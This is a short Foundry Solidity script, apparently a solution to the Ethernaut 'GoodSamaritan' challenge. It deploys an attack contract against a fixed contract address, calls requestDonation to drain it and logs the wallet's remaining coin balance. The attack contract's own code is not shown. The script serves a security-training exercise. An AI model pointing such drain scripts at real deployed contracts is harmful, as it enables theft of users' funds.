// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

import "../src/GoodSamaritan.sol";

contract GoodSamaritanTest is Script {
    function run() public {
        vm.startBroadcast();

        GoodSamaritan goodSamaritan = GoodSamaritan(0x8F7aaF11299482eC2A28a4e38f6eAb93C25e7D66);
        GoodSamaritanAttack attack = new GoodSamaritanAttack();
        console.log("develop attack on %s", address(attack));

        attack.requestDonation(goodSamaritan);

        console.log("good samaritan balance %d", goodSamaritan.coin().balances(address(goodSamaritan.wallet())));

        vm.stopBroadcast();
    }
}